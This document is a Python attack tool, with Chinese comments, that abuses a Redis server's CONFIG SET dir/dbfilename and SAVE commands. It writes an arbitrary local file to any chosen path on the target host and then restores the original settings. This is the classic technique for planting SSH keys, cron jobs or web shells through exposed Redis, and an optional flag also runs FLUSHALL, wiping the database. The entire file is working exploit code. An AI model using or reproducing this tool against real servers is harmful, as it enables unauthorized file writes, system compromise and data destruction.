# -*- coding=utf-8 -*-
import argparse
import sys
import socket

class redis:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.flushall = False

    def set_flushall(self,b):
        self.flushall = b

    def rdata(self,flag,c=None):
        if flag == "cgd": # config get dir
            data = "*3\r\n$6\r\nconfig\r\n$3\r\nget\r\n$3\r\ndir\r\n"
        elif flag == "cgn": # config get dbfilename
            data = "*3\r\n$6\r\nconfig\r\n$3\r\nget\r\n$10\r\ndbfilename\r\n"
        elif flag == "csd":# config set dir c
            data = "*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$%s\r\n%s\r\n" %(len(c),c)
        elif flag == "csn": # config set dbfilename c
            data = "*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n$%s\r\n%s\r\n" % (len(c),c)
        elif flag == "fa": # flushall
            data = "*1\r\n$8\r\nflushall\r\n"
        elif flag == "s": # save
            data = "*1\r\n$4\r\nsave\r\n"
        elif flag == "a": # auth passwd
            data = "*2\r\n$4\r\nauth\r\n$%s\r\n%s\r\n" % (len(c),c)
        elif flag == "i": # info
            data = "*1\r\n$4\r\ninfo\r\n"
        elif flag == "sk": # set key c
            data = "*3\r\n$3\r\nset\r\n$11\r\nredis_write\r\n$%s\r\n%s\r\n" % (len(c),c)
        return data.encode()


    def connect_redis(self,host,port,passwd=None):
        self.sock.connect((host,port))
        if passwd: 
            self.send_data(self.rdata("a",passwd))
        out = self.send_data(self.rdata("i")) 
        if "redis_version" in out:
            print("%s:%s 连接成功"% (host,port))
        else:
            print("连接失败")
            print(out)
            exit()
        
    def send_data(self,data):
        self.sock.send(data)
        out = b""
        while True:
            tmp = self.sock.recv(10240)
            #print(tmp)
            out = out + tmp 
            if len(tmp)==0 or tmp[-2]==13 or tmp[-2] == "\r":break # 存在bug
        return out.decode()
        

    def write_file(self,sfile,dfile):
        sdata = open(sfile,"r").read()
        filedir = "/".join(dfile.split('/')[:-1])
        filename = dfile.split('/')[-1]
        #记录原配置
        sdir = self.send_data(self.rdata("cgd")).split("\r\n")[-2]
        print("原目录 %s" % (sdir.encode() if not isinstance(sdir,str) else sdir))
        sdbfilename = self.send_data(self.rdata("cgn")).split("\r\n")[-2]
        print("原文件 %s" % (sdbfilename.encode() if not isinstance(sdbfilename,str) else sdbfilename))
        #写文件
        check = self.send_data(self.rdata("csd",filedir))
        if "OK" in check:
            print("文件 %s 写入成功" % dfile)
        else:
            print("文件 %s 写入失败!没有权限或目录不存在。" % dfile)
            exit()
        self.send_data(self.rdata("csn",filename))
        if self.flushall:
            self.send_data(self.rdata("fa"))
        self.send_data(self.rdata("sk","\n\n"+sdata.strip()+"\n\n"))
        self.send_data(self.rdata("s"))
        #还原配置
        self.send_data(self.rdata("csd",sdir))
        self.send_data(self.rdata("csn",sdbfilename))

        

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-d",metavar="IP",help="Redis IP")
    parser.add_argument("-p",metavar="Post",help="Redis Port")
    parser.add_argument("-a",metavar="Password",help="Redis Password")
    parser.add_argument("-f",action='store_true',help="Redis command flushall")
    parser.add_argument("SourceFile",help="Source File")
    parser.add_argument("DestinationFile",help="Destination File")
    args = parser.parse_args()
    ip = args.d
    port = args.p
    passwd = args.a
    sfile = args.SourceFile
    dfile = args.DestinationFile
    redis = redis()
    if args.f:
        redis.set_flushall(True)
    redis.connect_redis(ip,int(port),passwd)
    redis.write_file(sfile,dfile)


